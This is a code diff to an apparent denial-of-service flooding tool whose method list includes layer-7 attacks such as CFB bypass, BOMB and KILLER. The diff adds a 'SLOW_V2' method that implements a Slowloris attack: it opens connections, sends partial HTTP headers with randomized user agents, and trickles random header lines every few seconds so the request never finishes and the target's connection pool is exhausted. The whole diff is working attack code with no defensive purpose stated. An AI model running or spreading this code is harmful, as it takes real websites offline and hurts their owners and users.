@@ -124,7 +124,7 @@ def exit(*message):
 
 class Methods:
     LAYER7_METHODS: Set[str] = {
-        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
+        "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "SLOW_V2", "HEAD",
         "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
         "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
     }
@@ -1389,6 +1389,44 @@ class HttpFlood(Thread):
                     Tools.send(s, keep)
                     sleep(self._rpc / 15)
                     break
+        Tools.safe_close(s)
+
+    def SLOW_V2(self):
+        # [OPTIMIZED] Authentic Slowloris (Partial Headers)
+        # Based on gkbrk/slowloris: Send headers but NEVER finish the request.
+        # Ideally keeps the socket open forever.
+        
+        # 1. Partial Payload (No double \r\n at end)
+        partial_payload = (f"{self._req_type} {self._target.raw_path_qs} HTTP/1.1\r\n"
+                           f"Host: {self._target.authority}\r\n"
+                           f"User-Agent: {randchoice(self._useragents)}\r\n"
+                           f"Accept-language: en-US,en,q=0.5\r\n"
+                           f"Connection: keep-alive\r\n"
+                           f"Keep-Alive: {randint(300, 1000)}\r\n"
+                           f"Cache-Control: max-age=0\r\n").encode("utf-8")
+
+        s = None
+        with suppress(Exception), self.open_connection() as s:
+            # Send the partial header
+            Tools.send(s, partial_payload)
+            
+            # Keep-Alive Loop
+            for _ in range(self._rpc): # Use RPC as duration multiplier
+                # Wait before sending next header tick (Low & Slow)
+                sleep(randint(5, 15)) 
+                
+                try:
+                    # Send random header to keep connection alive
+                    # But STILL don't close the request body
+                    keep = f"X-a: {randint(1, 5000)}\r\n".encode("utf-8")
+                    if Tools.send(s, keep):
+                        # Success tick
+                        pass
+                    else:
+                        break # Socket died
+                except:
+                    break
+        
         Tools.safe_close(s)
 
 
